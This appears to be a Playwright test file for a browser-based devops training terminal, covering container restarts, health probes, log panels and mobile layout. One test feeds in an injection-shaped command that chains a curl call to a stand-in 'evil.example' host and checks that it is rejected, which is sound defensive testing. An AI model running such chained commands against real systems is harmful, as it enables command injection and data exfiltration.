import { expect, expectNoHorizontalOverflow, test } from './fixtures.mjs';

async function runCommand(page, command) {
  await page.getByTestId('terminal-host').click();
  await page.keyboard.type(command);
  await page.keyboard.press('Enter');
}

const terminalText = (page) => page.locator('.xterm-rows');

test('recovers the API through validated terminal commands', async ({ page }) => {
  await page.setViewportSize({ width: 1440, height: 900 });
  await page.goto('/');
  const containers = page.getByRole('list', { name: 'Session containers' });
  await expect(page.getByTestId('terminal-host')).toBeVisible();

  await runCommand(page, 'docker ps');
  await expect(terminalText(page)).toContainText('SERVICE');
  await expect(terminalText(page)).toContainText('stopped (0)');

  // An injection-shaped input is rejected and leaves resource state unchanged.
  const revisionBefore = await page.getByText(/Snapshot revision \d+/).textContent();
  await runCommand(page, 'docker start api; curl http://evil.example/x');
  await expect(terminalText(page)).toContainText('Shell operators, redirects, substitutions, and globs are not supported');
  await expect(containers.getByText('stopped', { exact: true })).toBeVisible();
  await expect(page.getByText(/Snapshot revision \d+/)).toHaveText(revisionBefore);

  await runCommand(page, 'docker logs api --tail 2');
  await expect(terminalText(page)).toContainText('HTTP server closed, exiting with code 0');

  await runCommand(page, 'curl http://api:3000/health');
  await expect(terminalText(page)).toContainText('curl: (7) Failed to connect to api port 3000: Connection refused');

  await runCommand(page, 'docker start api');
  await expect(containers.getByText('running', { exact: true })).toBeVisible();

  await runCommand(page, 'curl http://api:3000/health');
  await expect(terminalText(page)).toContainText('"status":"ok","service":"devops-playground"');
  await expect(page.getByRole('article', { name: 'Workload availability' }).getByText('Available', { exact: true })).toBeVisible();

  await runCommand(page, 'curl http://api:3001/health');
  await expect(terminalText(page)).toContainText('Port 3001 is not an approved probe port');
});

test('shows bounded, sanitized logs and the separate event stream', async ({ page }) => {
  await page.setViewportSize({ width: 1440, height: 900 });
  await page.goto('/');
  await page.getByRole('tablist', { name: 'Observation panels' }).getByRole('tab', { name: 'Logs' }).click();
  const logs = page.getByRole('list', { name: 'Workload log entries' });
  await expect(logs).toContainText('Received SIGTERM, closing HTTP server');

  await page.getByRole('button', { name: 'Pause autoscroll' }).click();
  await expect(page.getByRole('button', { name: 'Resume autoscroll' })).toHaveAttribute('aria-pressed', 'true');
  await page.getByRole('button', { name: 'Clear view' }).click();
  await expect(page.getByText('View cleared. Domain logs are kept.')).toBeVisible();
  await page.getByRole('button', { name: 'Show all entries' }).click();
  await expect(logs).toContainText('listening on port 3000');

  await page.getByRole('tab', { name: 'Events' }).click();
  await expect(page.getByRole('list', { name: 'Orchestration events' })).toContainText('operation.succeeded');
});

test('keeps terminal and logs usable on mobile', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 });
  await page.goto('/');
  const tabs = page.getByRole('tablist', { name: 'Workbench panels' });
  await tabs.getByRole('tab', { name: 'Terminal' }).click();
  await runCommand(page, 'help');
  await expect(terminalText(page)).toContainText('docker logs <service> [--tail N]');
  await expectNoHorizontalOverflow(page);
  await tabs.getByRole('tab', { name: 'Logs' }).click();
  await expect(page.getByRole('list', { name: 'Workload log entries' })).toContainText('Received SIGTERM');
  await expectNoHorizontalOverflow(page);
});
